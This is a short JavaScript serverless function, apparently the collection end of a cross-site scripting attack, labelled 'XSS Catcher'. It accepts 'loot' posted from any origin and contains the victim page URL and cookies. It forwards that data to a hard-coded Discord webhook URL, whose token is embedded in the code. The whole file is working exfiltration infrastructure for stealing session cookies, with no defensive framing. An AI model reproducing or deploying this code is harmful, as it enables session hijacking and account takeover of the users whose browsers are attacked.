const corsHeaders = {
    "Access-Control-Allow-Origin": "*", // Allows any site to send data
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
};

export async function onRequestOptions() {
    return new Response(null, { headers: corsHeaders });
}

export async function onRequestPost(context) {
    try {
        const loot = await context.request.json();
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1488396759217606778/pRWuYwEBHnrDJf4TEL1OP-pcKV2vfNkAm-w9BSYK4OHXHjrjq2zsD2nDcX7tbeEVO07e";

        const discordMessage = {
            username: "XSS Catcher",
            content: `🚨 **XSS HIT!** 🚨\n**Target:** ${loot.url}\n**Cookies:** \`${loot.cookies.substring(0, 500)}\``
        };

        await fetch(DISCORD_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(discordMessage)
        });

        return new Response("OK", { status: 200, headers: corsHeaders });
    } catch (e) {
        return new Response("Error", { status: 400, headers: corsHeaders });
    }
}
